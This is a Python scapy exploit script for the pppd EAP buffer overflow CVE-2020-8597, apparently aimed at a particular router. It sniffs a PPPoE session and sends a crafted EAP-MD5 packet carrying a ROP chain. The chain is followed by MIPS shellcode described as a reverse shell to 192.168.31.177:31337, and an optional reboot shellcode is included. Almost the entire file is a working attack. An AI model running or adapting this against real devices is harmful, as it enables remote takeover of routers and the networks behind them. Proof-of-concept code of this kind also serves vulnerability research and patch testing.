# Based on a PoC by "WinMin" (https://github.com/WinMin/CVE-2020-8597)
from scapy.all import *
from socket import *

interface = "en7"

def mysend(pay,interface = interface):
    sendp(pay, iface = interface)

def packet_callback(packet):

    global sessionid, src, dst
    sessionid = int(packet['PPP over Ethernet'].sessionid)
    dst = (packet['Ethernet'].dst)
    src = (packet['Ethernet'].src)
    # In case we pick up Router -> PPPoE server packet
    if src.startswith("88:c3:97") or src.startswith("8c:53:c3") :
        src,dst = dst,src
    print("sessionid:" + str(sessionid))
    print("src:" + src)
    print("dst:" + dst)

def eap_response_md5():

    md5 = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"

    # Reverse shell, connect to 192.168.31.177:31337, written by Jacob Holcomb

    stg3_SC =  b"\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
    stg3_SC += b"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
    stg3_SC += b"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
    stg3_SC += b"\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
    stg3_SC += b"\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
    stg3_SC += b"\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
    stg3_SC += b"\xf8\xff\xa5\xaf\x1f\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
    stg3_SC += b"\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
    stg3_SC += b"\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
    stg3_SC += b"\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
    stg3_SC += b"\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
    stg3_SC += b"\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
    stg3_SC += b"\xab\x0f\x02\x24\x0c\x09\x09\x01"

    reboot_shell =  b"\x23\x01\x06\x3c"
    reboot_shell += b"\x67\x45\xc6\x34"
    reboot_shell += b"\x12\x28\x05\x3c"
    reboot_shell += b"\x69\x19\xa5\x24"
    reboot_shell += b"\xe1\xfe\x04\x3c"
    reboot_shell += b"\xad\xde\x84\x34"
    reboot_shell += b"\xf8\x0f\x02\x24"
    reboot_shell += b"\x0c\x01\x01\x01"

    s0 = b"\x40\x61\xF1\x77" # uclibc sleep() base + 0x6c140 = 77F16140
    s1 = b"\x01\x00\x00\x00"
    s2 = b"\x41\x41\x41\x41"
    s3 = b"\x00\x64\xFF\x7F" # 7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]
    s4 = b"\x88\xe1\x40\x00" # pppd.txt:0x0040e188
    s5 = b"\x00\x00\x00\x00"

    ra = b"\x0C\x81\xF1\x77" # libuClibc.txt:0x0006e10c 77F1810C

    rop_chain =  (b'A' * 0x184)
    rop_chain += s0
    rop_chain += s1
    rop_chain += s2
    rop_chain += s3
    rop_chain += s4
    rop_chain += s5
    rop_chain += ra
    # Nop slide
    rop_chain += (b'\x00' * 0x100)
    # Small reboot shellcode for testing
    #rop_chain += reboot_shell
    rop_chain += stg3_SC
    # Just padding the end a little, since the last byte gets set to 0x00 and not everyone uses a 4 * 0x00 as nop
    rop_chain += (b'\x00' * 0x4)
    pay = Ether(dst=dst,src=src,type=0x8864)/PPPoE(code=0x00,sessionid=sessionid)/PPP(proto=0xc227)/EAP_MD5(id=100,value=md5,optional_name=rop_chain)
    mysend(pay)


if __name__ == '__main__':
    sniff(prn=packet_callback,iface=interface,filter="pppoes",count=1)

    eap_response_md5()
